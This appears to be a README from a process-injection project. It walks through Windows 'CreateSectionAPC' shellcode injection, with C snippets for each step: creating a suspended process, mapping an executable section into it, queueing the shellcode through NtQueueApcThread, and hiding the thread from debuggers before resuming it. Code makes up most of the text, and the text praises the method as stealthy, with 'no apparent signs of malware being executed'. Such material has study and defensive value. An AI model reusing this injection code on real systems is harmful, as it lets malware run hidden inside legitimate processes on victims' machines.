# Overview

This method is almost the same as CreateSection: the only difference is that the thread containing the shellcode will be put in an Asynchronous Procedure Calls queue.

An executable section will be created, just as CreateSection: this time however, the section entrypoint, containing the shellcode, will be put in an [Asynchronous Procedure Calls (APC)][APC] queue to finally run it.
This technique is stealthier than the `CreatePatched` one since there are no apperent signs of malware being executed.
For demonstration purposes, the target process will be manually created since we do not want to inject into already running applications into the system.

For the sake of clarity, from now on the executable that is injecting the code will be referred as **injector** process while the application which will be attacked will be the **target** process.

# Process creation

The first thing that has to be done is to create a legit process with [`CreateProcess()`][CreateProcess]. This is accomplished in this way: 
[(source)](CreateSectionAPC.cpp#L102-L116)
```c
if (!CreateProcessW((LPWSTR)app_path, // lpApplicationName
                            NULL,             // lpCommandLine
                            NULL,             // lpProcessAttributes
                            NULL,             // lpThreadAttributes
                            NULL,             // bInheritHandles
                            CREATE_SUSPENDED | DETACHED_PROCESS |
                            CREATE_NO_WINDOW, // dwCreationFlags
                            NULL,                 // lpEnvironment
                            NULL,                 // lpCurrentDirectory
                            &si,                  // lpStartupInfo
                            &pi                   // lpProcessInformation
                        )) {
    DBG_ERROR(("CreateProcess failed, Error = %x\n", GetLastError()));
    return -1;
}
```

Note the `CREATE_SUSPENDED` flag stops the application from starting automatically after the function call.
If the operation succeeds, the `pi` structure will contain all the information about the newly spawned process.

The execution of the application will be resumed later.

# Section creation 

It is now time to create the executable section. It will not be bind to any process, yet.
[(source)](CreateSectionAPC.cpp#L123-L128)
```c
if ((status = ZwCreateSection(&hShellcode, SECTION_ALL_ACCESS, NULL, &maxSize,
                            PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) !=
    STATUS_SUCCESS) {
    DBG_ERROR(("ZwCreateSection failed, status : %x\n", status));
    return -1;
}
```
There are several important variables being passed to [`ZwCreateSection()`][ZwCreateSection]: `&hSection`, `SECTION_ALL_ACCESS` and `PAGE_EXECUTE_READWRITE`.

`hSection` is the section handle: it will represent our new section.

`SECTION_ALL_ACCESS` is a bitwise flag which basically grants every permission to the section.

Finally, `PAGE_EXECUTE_READWRITE` makes the section's memory page readable, writeable and **executable**.

# Memory mapping

In order to write into the section, we will have to map a view, a whole or partial mapping of a section object, in the virtual address space of a process.

![MapSection]

The first step is to bind the section to the **injector** process' context in order to copy the shellcode in it. This is done with [`NtMapViewOfSection()`][NtMapViewOfSection]: its
second parameter, in this case the `HANDLE` returned by [`GetCurrentProcess()`][GetCurrentProcess], defines in which process the section will be mapped.
[(source)](CreateSectionAPC.cpp#L132-L138)
```c
if ((status = NtMapViewOfSection(hShellcode, GetCurrentProcess(),
                                &shellcodeSection, NULL, NULL, NULL,
                                &viewSize, inheritDisposition, NULL,
                                PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
    DBG_ERROR(("NtMapViewOfSection failed, status : %x\n", status));
    return -1;
}
```
Once the shellcode has been copied, we can proceed to map the section into the **target** process.
[(source)](CreateSectionAPC.cpp#L146-L152)
```c
if ((status =
        NtMapViewOfSection(hSection, pi.hProcess, &sectionBaseAddress2, NULL,
                            NULL, NULL, &viewSize, inheritDisposition, NULL,
                            PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
    DBG_ERROR(("NtMapViewOfSection failed, status : %x\n", status));
    return -1;
}
```
Finally, we have to unmap the view from the **injector**. The section handle `hSection` is closed and set to `NULL` afterwards.
[(source)](CreateSectionAPC.cpp#L156-L158)
```c
ZwUnmapViewOfSection(GetCurrentProcess(), shellcodeSection);
ZwClose(hShellcode);
hShellcode = NULL;
```

# Shellcode execution

The last thing to check out is the actual shellcode execution. This can be achieved by creating a new entry in the APC queue of the process: this entry will point to the entrypoint of the shellcode, `injectedBaseAddress`. In this way, the next time the thread is scheduled, it will run the APC function.
[(source)](CreateSectionAPC.cpp#L170-L172)
```c
if ((status = NtQueueApcThread(pi.hThread, injectedBaseAddress, 0, 0, 0)) !=
    STATUS_SUCCESS) {
    DBG_ERROR(("NtQueueApcThread failed, status : %x\n", status));
    return -1;
}
DBG_SUCC(("Thread created."));

DBG_SUCC(("Resuming main thread...\n"));
ZwSetInformationThread(pi.hThread, 1, NULL, NULL);
ResumeThread(pi.hThread);
```
# Resources

* [Source](CreateSectionAPC.cpp)
* [Header](CreateSectionAPC.h)

[MapSection]: ../resources/MapSection.png?raw=true
[APC]: https://msdn.microsoft.com/it-it/library/windows/desktop/ms681951(v=vs.85).aspx
[CreateProcess]: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx
[GetCurrentProcess]: https://msdn.microsoft.com/en-us/library/windows/desktop/ms683179(v=vs.85).aspx
[VirtualProtectEx]: https://msdn.microsoft.com/en-us/library/windows/desktop/aa366899(v=vs.85).aspx
[ZwCreateSection]: https://msdn.microsoft.com/en-us/library/windows/hardware/ff566428(v=vs.85).aspx
[NtMapViewOfSection]: https://msdn.microsoft.com/en-us/library/windows/hardware/ff556551(v=vs.85).aspx